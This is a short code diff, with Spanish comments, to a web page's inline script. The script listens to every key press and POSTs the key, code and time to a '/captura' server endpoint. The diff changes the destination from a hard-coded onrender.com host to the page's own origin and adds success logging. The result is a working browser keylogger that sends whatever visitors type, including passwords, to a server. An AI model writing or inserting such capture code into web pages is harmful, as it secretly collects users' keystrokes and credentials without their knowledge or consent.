@@ -12,7 +12,10 @@
 
   <script>
     document.addEventListener('keydown', function(e) {
-      fetch('https://backend-prueba-o523.onrender.com/captura', {
+      // Usar la URL actual del servidor (funciona tanto en local como en producción)
+      const baseUrl = window.location.origin;
+      
+      fetch(`${baseUrl}/captura`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -20,6 +23,12 @@
           code: e.code,
           time: new Date().toISOString()
         })
+      }).then(response => {
+        if (response.ok) {
+          console.log('Tecla capturada:', e.key);
+        }
+      }).catch(error => {
+        console.error('Error al enviar datos:', error);
       });
     });
   </script>
